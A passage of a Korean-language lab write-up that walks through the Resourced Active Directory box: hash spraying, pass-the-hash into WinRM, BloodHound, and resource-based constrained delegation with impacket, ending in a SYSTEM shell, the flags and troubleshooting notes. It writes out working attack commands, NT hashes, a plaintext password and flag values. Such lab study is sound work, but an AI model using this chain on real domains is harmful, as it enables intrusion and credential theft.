SMB         192.168.125.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:bd7c11a9021d2708eda561984f3c8939 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\P.Parker:980910b8fc2e4fe9d482123301dd19fe STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:fea5a148c14cf51590456b2102b29fac STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\D.Durant:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_PASSWORD_EXPIRED
SMB         192.168.125.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:62e16d17c3015c47b4d513e65ca757a2 STATUS_PASSWORD_EXPIRED
```
![[Pasted image 20260703141736.png]]
![[Pasted image 20260703142509.png]]

**플래그 해설** (nxc 1.4.0 `--help` 원문 실측)

| 플래그 | `--help` 원문 | 빼면 어떻게 되는가 |
|---|---|---|
| `-u users.txt -H hashs.txt` | — | 사용자 파일 + NT 해시 파일 |
| `--no-bruteforce` | *"No spray when using file for username and password (user1 => password1, user2 => password2)"* | **빼면 14×14 = 196회 조합 시도**가 된다. 잠금 정책이 있으면 **계정 전부를 잠근다** — 시험에서 이건 사고다. 두 파일이 **행 단위로 짝**이라는 것을 알려주는 플래그다 |
| `--continue-on-success` | *"continues authentication attempts even after successes"* | **빼면 첫 성공에서 멈춘다.** `L.Livingstone`에서 끝나 `V.Ventz`도 유효하다는 사실을 못 본다. **유효 자격증명은 전부 알아야 한다** |

> [!danger] `--no-bruteforce` 를 잊으면 도메인을 잠근다
> 두 파일을 주면 nxc의 **기본 동작은 전조합 스프레이**다. 해시 14개 × 사용자 14명 = 196회 실패 시도가 순식간에 나가고, **`Account lockout threshold`가 설정된 도메인이면 전 계정이 잠긴다.**
> 잠긴 계정은 **리버트 말고는 되돌릴 방법이 없다** — 시험이라면 그 박스에서 몇 시간을 날린다.
> 반사: **`-u 파일 -p/-H 파일` 을 쓸 때는 `--no-bruteforce` 가 기본값이라고 생각하라.**

`L.Livingstone` — BloodHound description에 **`SysAdmin`** 이라고 적혀 있던 그 계정이다.

### 4-2. PtH → WinRM — 왜 이 사용자만 WinRM이 되는가

```bash
┌──(kali㉿kali)-[~/PG/Resourced/registry]
└─$ evil-winrm -i 192.168.125.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> type ../desktop/local.txt
7a1b4d1533fb4d6bea00b6af60a08d15
```
![[Pasted image 20260703142645.png]]

BloodHound 그룹 덤프가 **왜 이 사용자만 되는지** 확인해 준다:

```bash
$ jq -r '.data[] | select(.Members[]?.ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1105")
         | .Properties.name' 20260703143203_groups.json
REMOTE MANAGEMENT USERS@RESOURCED.LOCAL
REMOTE DESKTOP USERS@RESOURCED.LOCAL
```

**`Remote Management Users` 멤버십**이 WinRM 접속의 조건이다(관리자가 아니어도 이 그룹이면 된다). §1-3에서 `V.Ventz`가 WinRM에서 `[-]`였던 이유가 여기 있다 — 그는 이 그룹에 없다.

> [!note] 왜 해시만으로 인증이 되는가 → **§2-8** 에서 프로토콜 수준으로 다뤘다
> 한 줄 요약: NTLM에서 **NT 해시는 «비밀번호의 지문»이 아니라 «비밀번호를 대체하는 키»** 다. 그래서 크랙이 필요 없다.
> Kerberos 쪽 대응물은 **Pass-the-Key / OverPass-the-Hash** 이고, RC4가 꺼진 도메인에서는 NT 해시 대신 **`aes256` 키**가 필요하다.

> [!warning] ⚠️ 플래그는 **대화형 셸**에서 읽는다
> evil-winrm은 **완전한 대화형 PowerShell 세션**이므로 OSCP 증거로 인정된다. 웹셸에서 `type`으로 읽은 플래그는 **0점**이다 — 규정 원문은 *"this includes any type of web-based shell"* ([[Butch]] 참조).
> 시험 습관대로 한 화면에 담아라:
> ```powershell
> whoami; hostname; ipconfig; type C:\Users\L.Livingstone\Desktop\local.txt
> ```

### 4-3. BloodHound 수집

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns 192.168.125.175 -c all --dns-timeout 30
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: resourced.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (resourcedc.resourced.local:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Done in 00M 13S
```

산출물은 지금도 남아 있다 — `20260703143203_{computers,containers,domains,gpos,groups,ous,users}.json` 7개. **이 노트의 ACE·그룹·UAC 판정은 전부 이 JSON을 직접 조회해 얻은 것**이다.

> [!warning] `Failed to get Kerberos TGT ... Connection refused` 는 **실패가 아니다**
> 경고가 뜨고도 수집은 정상 완료됐다(`Done in 00M 13S`). bloodhound-python은 Kerberos를 먼저 시도하고 **실패하면 NTLM으로 폴백**한다.
> `Connection refused`(errno 111)는 "이름은 풀렸는데 그 주소의 88번이 연결을 거부했다"는 뜻이다. nmap은 88이 열려 있음을 보여주므로, **`-ns`가 준 DNS가 `resourcedc.resourced.local`을 우리가 의도한 곳이 아닌 주소로 풀었을 가능성이 크다** — **[가정]**, 패킷을 뜨지 않아 확정할 수 없다.
> **실무적 판단: 데이터가 나왔으면 이 경고는 무시해도 된다.** 다만 뒤에서 **진짜 Kerberos를 써야 할 때(§4-5)는 이 이름 해석 문제가 치명적이 된다.**

BloodHound UI에서 `L.Livingstone`이 `RESOURCEDC$`에 대해 **`GenericAll`** 을 갖는 것을 확인했다:
![[Pasted image 20260706091608.png]]

### 4-4. RBCD 3단 — 머신계정 생성 → 위임 설정 → 티켓 발급

> [!danger] 이 시점에 타겟 IP가 **192.168.125.175 → 192.168.120.175** 로 바뀌었다
> 리버트/재배정으로 IP가 갈렸다(7월 3일 → 7월 6일). 아래 명령들의 IP가 §1~§4-3과 다른 것은 **오타가 아니다.**
> zsh_history에 그 증거가 남아 있다 — `evil-winrm -i 192.168.125.175 ...`(구 IP, 실패) 바로 다음 줄에 `evil-winrm -i 192.168.120.175 ...`(신 IP).
> **PG/시험에서 박스를 리버트하면 IP가 바뀐다. `/etc/hosts`·스크립트·노트에 박아 둔 IP를 전부 갱신하라.** 이걸 놓치면 "갑자기 되던 게 안 된다"로 30분을 태운다.

**① 머신계정 생성**

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer -computer-name '4Leaf$' -computer-pass 'a123a123!@' \
  -dc-ip 192.168.120.175 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account 4Leaf$ with password a123a123!@.
```
![[Pasted image 20260706104812.png]]

| 요소 | 의미 |
|---|---|
| `-computer-name '4Leaf$'` | **`$` 를 반드시 붙이고 작은따옴표로 감싼다.** 머신계정의 `sAMAccountName`은 관례상 `$`로 끝난다. **큰따옴표를 쓰면 셸이 `$'` 를 변수로 해석해 이름이 깨진다** |
| `-computer-pass 'a123a123!@'` | 우리가 아는 비밀번호. **뒤 §4-4③에서 이 계정으로 인증하므로 반드시 기억해야 한다** |
| `-hashes :19a3…` | **LM 자리를 비우고 콜론으로 시작한다.** `LMHASH:NTHASH` 형식에서 LM은 안 쓰므로 빈 문자열. 콜론을 빠뜨리면 파싱 실패 |
| `-dc-ip` | LDAP/SAMR 대상. 없으면 도메인 FQDN을 DNS로 풀려다 실패한다 |
| (기본) `-method SAMR` | `--help` 원문: *"SAMR works over SMB. LDAPS has some certificate requirements and isn't always available."* **LDAPS 인증서가 없는 랩에서는 SAMR이 정답**이고 그것이 기본값이다 |

**② RBCD 속성 쓰기**

```bash
impacket-rbcd -delegate-from '4Leaf$' -delegate-to 'RESOURCEDC$' -action write \
  -dc-ip 192.168.120.175 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
```
![[Pasted image 20260706104945.png]]

`-delegate-to` 객체의 **`msDS-AllowedToActOnBehalfOfOtherIdentity`** 에 `-delegate-from` 의 SID를 담은 보안 서술자를 써넣는다. 이 쓰기가 가능한 이유가 바로 §2-5의 `GenericAll` 이다.

> [!tip] `-action read` 로 먼저 확인하고, 끝나면 `-action remove` 로 치워라
> `impacket-rbcd --help` 실측: `-action [{read,write,remove,flush}]`.
> - `read` — 현재 값을 본다. **쓰기 전에 기존 값이 있는지 확인**하는 습관(덮어쓰면 정상 위임을 깨뜨릴 수 있다)
> - `remove` — 내가 추가한 항목만 제거 / `flush` — 속성 전체 비우기. **실무 침투테스트에서는 정리가 의무**다

**③ S4U — Administrator 사칭 티켓 발급**

```bash
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator \
  -dc-ip 192.168.120.175 'resourced.local/4Leaf$:a123a123!@'
```
![[Pasted image 20260706105049.png]]

| 요소 | 의미 |
|---|---|
| `-spn 'cifs/resourcedc.resourced.local'` | **어떤 서비스에 쓸 티켓인가.** `cifs`는 SMB 파일/관리 공유 → psexec·smbexec·smbclient가 이걸 쓴다. WinRM이 필요하면 `http/…`, WMI면 `host/…` 또는 `cifs/…` |
| `-impersonate Administrator` | 사칭 대상. S4U2Self + S4U2Proxy를 연달아 수행한다 |
| `'resourced.local/4Leaf$:a123a123!@'` | **①에서 만든 계정으로** 인증한다. `L.Livingstone`이 아니다 — 위임 권한을 가진 주체는 `4Leaf$`다 |

성공하면 **현재 디렉터리에** ccache 파일이 떨어진다. 파일명 규칙은 `<사칭대상>@<SPN을 _ 로 치환>@<REALM>.ccache` 다.

### 4-5. 발급된 티켓의 실체 — Kali에 남은 ccache를 직접 열어 확인

이 노트에서 가장 확실한 증거다. **파일이 지금도 있다.**

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ export KRB5CCNAME=~/PG/Resourced/Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

┌──(kali㉿kali)-[~/PG/Resourced]
└─$ klist -c "$KRB5CCNAME"
Ticket cache: FILE:/home/kali/PG/Resourced/Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
Default principal: Administrator@resourced.local

Valid starting       Expires              Service principal
07/06/2026 10:50:38  07/06/2026 20:50:38  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
	renew until 07/07/2026 10:50:38
```

```bash
┌──(kali㉿kali)-[~/PG/Resourced]
└─$ impacket-describeTicket "$KRB5CCNAME"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 39be433e1df3909eb45ba4477b7d0ae8
[*] User Name                     : Administrator
[*] User Realm                    : resourced.local
[*] Service Name                  : cifs/resourcedc.resourced.local
[*] Service Realm                 : RESOURCED.LOCAL
[*] Start Time                    : 06/07/2026 10:50:38 AM
[*] End Time                      : 06/07/2026 20:50:38 PM (expired)
[*] RenewTill                     : 07/07/2026 10:50:38 AM (expired)
[*] Flags                         : (0x40a50000) forwardable, renewable, pre_authent, ok_as_delegate, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : cifs/resourcedc.resourced.local
[*]   Service Realm               : RESOURCED.LOCAL
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

**이 출력에서 확정되는 사실 넷**

1. **캐시에 자격증명이 «1개»뿐이고 그것이 TGT가 아니라 서비스 티켓이다.** `krbtgt/RESOURCED.LOCAL` 항목이 없다 — `getST`는 **S4U 결과인 서비스 티켓만** 저장한다. 그래서 이 ccache로는 **`cifs/resourcedc.resourced.local` 외의 서비스에 붙을 수 없다.** LDAP이나 WinRM이 필요하면 `-spn`을 바꿔 다시 발급해야 한다.
2. **`forwardable` 플래그가 켜져 있다.** §2-6에서 말한 S4U2Proxy의 전제조건이 실제로 충족됐다는 직접 증거다.
3. **`ok_as_delegate`** — 서비스(RESOURCEDC)가 위임 허용으로 표시돼 있다.
4. **티켓 본체는 `aes256`(etype 18)로 암호화**돼 있고 세션 키는 `rc4_hmac`이다. 본체는 **서비스 계정의 키로 암호화**되므로 우리가 못 깐다 — describeTicket이 `Could not find the correct encryption key`라고 말하는 것이 **정상**이다. 우리에게 필요한 것은 본체가 아니라 **세션 키**이고 그건 캐시에 평문으로 있다.

> [!note] 이 티켓을 **Kerberoast 대상으로 착각하지 마라**
> `describeTicket` 출력에 `Kerberoast hash`가 딸려 나오지만, 이 티켓은 **머신계정(RESOURCEDC$)의 키로 암호화**돼 있다. 머신계정 비밀번호는 120자 랜덤이라 **크랙이 사실상 불가능**하다.
> Kerberoasting이 성립하는 것은 **사람이 만든 서비스 계정**(SPN이 걸린 일반 사용자)의 티켓뿐이다. 도구가 해시를 뱉는다고 크랙 대상인 것이 아니다.

### 4-6. 티켓으로 SYSTEM — `/etc/hosts` 와 `-k -no-pass`

```bash
┌──(kali㉿kali)-[~]
└─$ sudo sed -i '/resourced.local/d' /etc/hosts

┌──(kali㉿kali)-[~]
└─$ echo "192.168.120.175  resourcedc.resourced.local resourced.local" | sudo tee -a /etc/hosts
192.168.120.175  resourcedc.resourced.local resourced.local

┌──(kali㉿kali)-[~]
└─$ impacket-psexec -k -no-pass resourcedc.resourced.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file kEggVEPn.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service udmb on resourcedc.resourced.local.....
[*] Starting service udmb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

> [!danger] `-k -no-pass` 로 붙을 때는 **IP가 아니라 FQDN을 타겟으로 줘야 한다**
> `impacket-psexec --help` 원문(실측):
> > `-k    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) **based on target parameters.** If valid credentials cannot be found, it will use the ones specified in the command line`
>
> **"based on target parameters"** 가 핵심이다 — impacket은 **명령행에 준 타겟 문자열로 SPN을 조립**해서 ccache에서 찾는다.
> - 타겟에 `192.168.120.175`를 주면 `cifs/192.168.120.175` 를 찾는다 → **캐시에 없다** → Kerberos 실패
> - 타겟에 `resourcedc.resourced.local`을 주면 `cifs/resourcedc.resourced.local` → **정확히 §4-5의 그 티켓**
>
> 그래서 **① `/etc/hosts`에 FQDN을 등록하고 ② 타겟을 FQDN으로 준다.** 이 두 가지가 함께여야 한다.
> `-no-pass`는 *"don't ask for password (useful for -k)"* — 없으면 비밀번호 프롬프트에서 멈춘다.

zsh_history가 이 순간의 시행착오를 그대로 보존하고 있다:

```
export KRB5CCNAME='Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache'
whoami
getent hosts resourcedc.resourced.local          ← 이름 해석 확인 (실패)
grep resourced /etc/hosts                        ← 기존 항목 확인
sudo sed -i '/resourced.local/d' /etc/hosts      ← 옛 IP 항목 제거
echo "192.168.120.175  resourcedc.resourced.local resourced.local" | sudo tee -a /etc/hosts
impacket-psexec -k -no-pass resourcedc.resourced.local   ← 성공
```

**`sed -i '/resourced.local/d'` 를 «먼저» 돌린 것이 요령이다.** 리버트로 IP가 바뀌었으므로 옛 항목이 남아 있으면 **먼저 매칭된 옛 IP가 이긴다.** 추가만 하고 삭제를 안 하면 원인 모를 실패가 계속된다.

> [!warning] `KRB5CCNAME` 을 **상대 경로**로 export 했다 — 디렉터리를 옮기면 깨진다
> 실제로 쓴 값은 파일명만이다: `export KRB5CCNAME='Administrator@cifs_...ccache'`.
> 그 시점의 `cwd`가 `~` 였고 파일도 `~`에 있어서 동작했지만, 직후 history에 `mv Administrator@cifs_...ccache ./PG/Resourced` 가 있다 — **옮긴 뒤에는 같은 셸에서 `-k`가 조용히 실패한다.**
> **반사: `KRB5CCNAME`은 항상 절대 경로로 준다.**
> ```bash
> export KRB5CCNAME=$(realpath 'Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache')
> klist        # 반드시 확인하고 넘어간다
> ```

---

## 5. 플래그

| 플래그 | 경로 | 값 | 획득 방법 |
|---|---|---|---|
| **local.txt** | `C:\Users\L.Livingstone\Desktop\local.txt` | `7a1b4d1533fb4d6bea00b6af60a08d15` | evil-winrm (PtH) — **대화형 PowerShell** |
| **proof.txt** | `C:\Users\Administrator\Desktop\proof.txt` | `5c7891bdc3a7fc5628221ef49b43b839` | impacket-psexec (`-k -no-pass`) — **대화형 cmd, `nt authority\system`** |

```bash
:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\Administrator\Desktop

10/01/2021  04:28 AM    <DIR>          .
10/01/2021  04:28 AM    <DIR>          ..
07/05/2026  06:46 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,007,508,480 bytes free

C:\Users\Administrator\Desktop> type proof.txt
5c7891bdc3a7fc5628221ef49b43b839
```

> [!tip] 시험 증거 형식 — 두 플래그 모두 이 형태로 다시 찍어라
> ```cmd
> whoami && hostname && ipconfig && type C:\Users\Administrator\Desktop\proof.txt
> ```
> **둘 다 대화형 셸에서 읽었으므로 증거로 유효하다.** psexec 세션은 `nt authority\system`이므로 `whoami` 한 줄이 곧 권한 증명이 된다.

---

## 6. 막혔던 지점 / 시행착오

**전부 `~/.zsh_history` 1336–1501행과 Kali 산출물에서 회수한 실제 기록**이다. 재구성이 아니다.

### 6-1. `nxc-sweep` 은 `-H`(해시)를 지원하지 않는다 — `sweep.txt` 가 그 증거다

Kali에 남은 `~/PG/Resourced/sweep.txt` 는 **1줄짜리 사용법 에러**다:

```
Usage: nxc-sweep <IP> -u <username> -p <password> [global flags]
```

history를 보면 어떻게 여기 도달했는지가 보인다:

```
nxc-sweep 192.168.125.175 -u users.txt -p hashs.txt         ← ① 해시를 -p 로 줌
nxc-sweep 192.168.125.175 -u users.txt -H hashs.txt > sweep.txt   ← ② -H 시도 → 사용법 에러가 파일에 저장됨
nxc-sweep 192.168.125.175 -u users.txt -H hashs.txt         ← ③ 화면에서 재확인
ping 192.168.125.175                                        ← ④ "박스가 죽었나?" 의심
nxc smb 192.168.125.175 -u users.txt -H hashs.txt --no-bruteforce --continue-on-success   ← ⑤ 정답
```

> [!danger] **④ 가 이 박스에서 가장 비싼 순간이다** — 도구 사용법 오류를 «네트워크 문제»로 오독했다
> 래퍼가 `-p`만 파싱하는데 `-H`를 주니 사용법을 뱉었을 뿐인데, 출력을 파일로 리다이렉트해 **화면에서 못 봤고**, 그래서 `ping`으로 박스를 의심했다.
> **반사 두 개**:
> 1. **낯선 래퍼/스크립트는 `-h` 로 인터페이스부터 확인한다.** 표준 도구의 플래그가 그대로 통할 거라 가정하지 마라
> 2. **`> file` 로 리다이렉트하면 에러가 안 보인다.** 처음 돌릴 때는 `| tee file` 로 화면과 파일에 동시에 남겨라

### 6-2. 공백이 든 공유 이름 — `smbclient` 인용 지옥

history 1360–1387행, **성공하기까지 8번을 틀렸다**:

```
smbclient -U 'V.Ventz' -pHotelCalifornia194!' //192.168.125.175\    ← 따옴표 불균형
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' //192.168.125.175\
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' //192.168.125.175
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' \\192.168.125.175   ← 백슬래시가 셸에서 이스케이프됨
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' 192.168.125.175
smbclient -U 'V.Ventz%HotelCalifornia194!' //192.168.125.175
smbclient -U 'V.Ventz%HotelCalifornia194!' //192.168.125.175/share  ← 존재하지 않는 공유명 추측
smbclient //192.168.125.175/Password Audit                          ← 공백에서 인자가 갈라짐
smbclient '//192.168.125.175/Password Audit'                        ← 인용은 맞지만 -U 없음
smbclient '//192.168.125.175/Password Audit' -U V.Ventz             ← ★ 성공
```

> [!danger] `smbclient` 의 함정 셋 — 이 순서로 확인하라
> 1. **`-p` 는 비밀번호가 아니라 «포트» 다.** `smbclient`에서 비밀번호는 `-U user%pass` 또는 프롬프트다. 위 시도들이 안 된 근본 원인이 이것이다
> 2. **공유 이름에 공백이 있으면 UNC 전체를 작은따옴표로 감싼다** — `'//IP/Password Audit'`. 감싸지 않으면 `Audit`이 별개 인자가 된다
> 3. **`\\IP\share` 는 리눅스 셸에서 쓰지 마라.** 백슬래시가 이스케이프로 먹힌다. **항상 `//IP/share`**
>
> 가장 안전한 한 줄:
> ```bash
> smbclient '//192.168.125.175/Password Audit' -U 'V.Ventz%HotelCalifornia194!'
> ```

### 6-3. `secretsdump` 에서 `local` 을 빠뜨림

history 1357 → 1358, **연속 두 줄**이다. §2-3에서 실제 에러를 재현했다.
`local`이 옵션이 아니라 **위치 인자**라는 사실을 모르면 "하이브가 손상됐나?"로 새기 쉽다. 걸린 시간은 짧았지만 **오독의 방향이 위험했다.**

### 6-4. `ntpdate` 가 Kali에 없다 — Kerberos 시계 동기

RBCD 단계 직전, history 1466–1470행에 **네 번의 시도**가 있다:

```
sudo tee -a 192.168.120.175        ← ① /etc/hosts 를 빠뜨려 «파일» 을 만들어 버림
sudo ntpdate 192.168.120.175       ← ② 명령 없음
sudo ntp date 192.168.120.175      ← ③ 오타
sudo rdate -n 192.168.120.175      ← ④ 성공 경로
ping 192.168.120.175
```

**①이 만든 쓰레기 파일**은 나중에 발견돼 지워졌다 — history 1490–1492: `cat 192.168.120.175` → `rm 192.168.120.175` → `rm -rf 192.168.120.175`.

실측으로 확인한 사실들(2026-08-20, 같은 Kali):

```bash
┌──(kali㉿kali)-[~]
└─$ apt-cache policy ntpdate
ntpdate:
  Installed: (none)
  Candidate: (none)

┌──(kali㉿kali)-[~]
└─$ rdate
Usage: rdate [-46acnpsv] [ -b sec ] [-o port] [ -t msec ] host
  -n: use SNTP instead of RFC868 time protocol
  -p: just print, don't set
```

> [!danger] **현행 Kali에는 `ntpdate` 가 «패키지조차» 없다** — `rdate -n` 을 외워라
> `Candidate: (none)` — 설치가 안 된 게 아니라 **저장소에서 사라졌다.** 오래된 워크스루의 `sudo ntpdate <DC>` 를 그대로 치면 `command not found` 다.
> **`-n` 이 필수인 이유**: `rdate`의 기본은 **RFC 868 (TCP 37번)** 인데, **Windows DC는 그 서비스를 제공하지 않는다.** 실제로 이 박스의 `-p-` 전수 스캔 결과에 **37번 포트가 없다.** `-n`을 주면 **SNTP(UDP 123)** 를 쓰고, 그것이 Windows Time(W32Time)이 실제로 서비스하는 프로토콜이다.
> ```bash
> sudo rdate -n <DC_IP>          # 실제로 맞춘다
> sudo rdate -n -p <DC_IP>       # 맞추지 않고 DC 시각만 본다 (안전한 사전 확인)
> ```

> [!note] 왜 Kerberos에서 시계가 문제인가 — `KRB_AP_ERR_SKEW`
> Kerberos 사전인증은 클라이언트가 **현재 시각(타임스탬프)** 을 자기 키로 암호화해 보내는 방식이다. KDC는 그것을 복호화해 **자기 시계와 비교**하고, 차이가 허용치(기본 **5분**)를 넘으면 거부한다. 재전송 공격을 막는 설계다.
> 증상은 `KRB5KRB_AP_ERR_SKEW(Clock skew too great)` 이며, impacket·kerbrute·evil-winrm 어디서 나오든 원인은 하나다.
> **주의**: 이 박스에서 실제로 이 에러가 났다는 기록은 없다. **시계를 먼저 맞추고 들어간 것**이고, 그래서 §4-4 이후가 매끄럽게 진행됐다. **에러를 보고 고치는 것보다 «Kerberos를 쓰기 전에 맞추는 것»이 옳은 순서다.**
> nmap 출력이 사전 점검 도구가 된다 — `kerberos-sec (server time: 2026-07-03 00:14:06Z)` 와 `ssl-date: ... 0s from scanner time` 를 자기 시계와 비교하라.

### 6-5. 이름 해석 — `getent hosts` 가 빈손으로 돌아왔다

§4-6의 history 흐름이 보여주듯, `getST`로 티켓을 받은 **직후에** `getent hosts resourcedc.resourced.local` 을 확인했다. VPN 뒤 타겟의 FQDN은 Kali의 DNS로 풀리지 않는다.

> [!tip] AD 박스는 **nmap 직후 곧바로** `/etc/hosts` 에 등록하고 시작하라
> ```bash
> echo "192.168.120.175  resourcedc.resourced.local resourced.local RESOURCEDC" | sudo tee -a /etc/hosts
> getent hosts resourcedc.resourced.local     # 확인. 빈 출력이면 등록 실패다
> ```
> 등록해야 할 이름은 셋이다 — **FQDN**(`resourcedc.resourced.local`, SPN용) · **도메인**(`resourced.local`, LDAP/Kerberos realm용) · **넷바이오스명**(`RESOURCEDC`).
> 이걸 미루면 **Kerberos·LDAPS·`-k` 인증이 전부 원인 불명으로 실패**한다. 비용 30초, 회수 30분.

### 6-6. 리버트로 IP가 바뀐 것을 늦게 알아챘다

history 1500 → 1501:

```
evil-winrm -i 192.168.125.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808   ← 옛 IP
evil-winrm -i 192.168.120.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808   ← 신 IP
```

세션이 바뀌면(7/3 → 7/6) 박스 IP가 재배정된다. **노트·`/etc/hosts`·셸 히스토리에 남은 IP는 전부 낡은 것**이다.

> [!tip] 세션을 다시 시작하면 **첫 명령은 IP 확인**이다
> ```bash
> ip -br a                 # 내 tun0 (리버스셸 LHOST 가 바뀐다)
> ping -c1 <타겟IP>        # 타겟 생존
> grep -n '<도메인>' /etc/hosts   # 낡은 항목이 남아 있는지
> ```

### 6-7. 사소하지만 실제로 태운 것들

| 무엇 | history | 교훈 |
|---|---|---|
| `abloodhound-python …` 오타 후 재입력 | 1399 → 1400 | — |
| `nxc sweep -t <IP>` / `nxc-sweep -t <IP>` 등 래퍼 문법 5회 시행착오 | 1342–1350 | 래퍼 인터페이스는 표준 도구와 다르다 (§6-1과 같은 뿌리) |
| `smbclient '//IP/SYSVOL'`·`'//IP/IPC$'` 도 열어봄 | 1386–1387 | **좋은 습관이다.** SYSVOL에는 GPP `cpassword`가 있을 수 있다. 이 박스에서는 소득 없음 |

### 6-8. **순서가 틀렸다** — BloodHound를 3시간 50분 늦게 돌렸다

파일 타임스탬프와 스크린샷 파일명이 **시각을 정확히 기록**하고 있어서, 이 박스의 진행을 분 단위로 복원할 수 있다.

| 시각 | 사건 | 근거 |
|---|---|---|
| 09:13 | nmap 시작 | `nmap.log` 헤더 |
| 10:19 | `nxc --users` → `V.Ventz` 비밀번호 발견 | `Pasted image 20260703101938.png` |
| **10:42** | **`V.Ventz` 자격증명이 유효함을 확인** | `Pasted image 20260703104211.png` (nxc-sweep) |
| 13:21 | `Password Audit` 공유 회수 완료 | `Active Directory/ntds.dit` mtime |
| 13:46 | `registry/` 로 `ntds.dit` 복사 | `registry/ntds.dit` mtime |
| 13:48 | secretsdump 완료 | `Pasted image 20260703134859.png` |
| 13:52 | 해시 정리 (`hashs.txt`) | `hashs.txt` mtime |
| 14:17 | 해시 검증 → `L.Livingstone` | `Pasted image 20260703141736.png` |
| 14:26 | evil-winrm → `local.txt` | `Pasted image 20260703142645.png` |
| **14:32** | **BloodHound 수집** | JSON 파일명 `20260703143203_*` |

> [!danger] **BloodHound를 돌릴 수 있게 된 시점(10:42)과 실제로 돌린 시점(14:32) 사이가 «3시간 50분»이다**
> `bloodhound-python` 은 **`V.Ventz` 자격증명만으로 충분했다** — 실제로 §4-3의 명령이 쓴 것이 정확히 그 계정이다(`-u v.ventz -p 'HotelCalifornia194!'`).
> 즉 **10:45에 돌릴 수 있었고, 돌렸다면 그 자리에서 `L.Livingstone --GenericAll--> RESOURCEDC$` 를 봤을 것**이다.
> 그랬다면 §6-1의 래퍼 삽질도, §6-2의 인용 지옥도 **«목표가 분명한 상태»에서 겪었을 것**이다 — 같은 시간을 써도 방황이 아니라 진행이 된다.
>
> **규칙으로 만들어라: «유효한 도메인 자격증명 «하나»를 얻는 즉시 BloodHound를 돌린다.»**
> 다른 조사와 **병렬로** 돌아간다(13초면 끝난다). 공유를 뒤지는 동안 그래프가 준비된다.
> ```bash
> bloodhound-python -d <domain> -u <user> -p '<pass>' -ns <DC_IP> -c all --dns-timeout 30 &
> # 그 사이에 공유 열거를 계속한다
> ```
> **이것이 이 박스에서 가장 값비싼 교훈이다** — 도구 오류(§6-1·§6-2)는 30분을 태웠지만, **순서 오류는 4시간을 태웠다.**

### 6-9. 재현 최소 경로 — 이 박스를 다시 푼다면 12줄

시행착오를 전부 걷어내면 이렇게 남는다. **손절 판단의 기준선**으로 쓴다.

```bash
# 0) 준비 — AD 박스는 이 두 줄로 시작한다
echo "<IP>  resourcedc.resourced.local resourced.local RESOURCEDC" | sudo tee -a /etc/hosts
sudo rdate -n <IP>                                  # 시계. 실패해도 -p 로 차이만은 확인

# 1) 익명 열거 → description 에서 비밀번호
